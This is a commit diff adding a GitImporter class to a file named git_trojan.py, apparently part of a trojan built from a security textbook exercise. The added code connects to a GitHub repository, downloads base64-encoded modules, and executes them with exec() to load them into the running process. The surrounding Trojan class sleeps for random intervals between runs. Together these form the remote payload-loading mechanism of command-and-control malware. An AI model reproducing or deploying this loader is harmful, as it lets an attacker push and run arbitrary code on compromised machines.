15e51e1ae6ec57c6222febea88a68be050628010
mvstermind <zablockidawid1@gmail.com>
2024-10-22 20:53:01 +0200

    git importter

--- bhptrojan/git_trojan.py
+++ bhptrojan/git_trojan.py
@@ -59,3 +59,26 @@ class Trojan:
                 time.sleep(random.randint(1, 10))
 
             time.sleep(random.randint(30 * 60, 3 * 60 * 60))
+
+
+class GitImporter:
+    def __init__(self):
+        self.current_module_code = ""
+
+    def find_module(self, name, path=None):
+        print("[*] Attemptimt to retrieve %s" % name)
+        self.repo = github_connect()
+
+        new_library = get_file_contents("modules", f"{name}.py", self.repo)
+        if new_library is not None:
+            self.current_module_code = base64.b64decode(new_library)
+            return self
+
+    def load_module(self, name):
+        spec = importlib.util.spec_from_loader(
+            name, loader=None, origin=self.repo.git_url
+        )
+        new_module = importlib.util.module_from_spec(spec)
+        exec(self.current_module_code, new_module.__dict__)
+        sys.modules[spec.name] = new_module
+        return new_module
